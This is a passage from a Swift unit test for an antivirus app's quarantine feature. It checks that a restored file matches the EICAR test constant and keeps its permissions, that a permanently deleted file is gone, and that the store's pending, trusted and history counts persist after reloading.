        let restoreRecord = try XCTUnwrap(reloaded.quarantine.first { $0.detection.primary.path == paths["quarantine"]!.path })
        reloaded.restore(restoreRecord, andTrust: false)
        try await waitUntilIdle(reloaded)
        XCTAssertEqual(try Data(contentsOf: paths["quarantine"]!), AntivirusRules.eicar)
        XCTAssertEqual(permissions(paths["quarantine"]!.path), 0o600)
        XCTAssertFalse(FileManager.default.fileExists(atPath: reloaded.quarantineFolder.appendingPathComponent(restoreRecord.id.uuidString).path))

        let deleteRecord = try XCTUnwrap(reloaded.quarantine.first { $0.detection.primary.path == paths["delete"]!.path })
        reloaded.deleteForever(deleteRecord)
        try await waitUntilIdle(reloaded)
        XCTAssertNil(reloaded.lastError)
        XCTAssertTrue(reloaded.quarantine.isEmpty)
        XCTAssertFalse(FileManager.default.fileExists(atPath: reloaded.quarantineFolder.appendingPathComponent(deleteRecord.id.uuidString).path))
        XCTAssertFalse(FileManager.default.fileExists(atPath: paths["delete"]!.path))

        let final = AntivirusStore(folder: storeFolder)
        XCTAssertTrue(final.quarantine.isEmpty)
        XCTAssertEqual(final.pending.count, 2)
        XCTAssertEqual(final.trusted.count, 1)
        XCTAssertEqual(final.history.count, 2)
    }
}
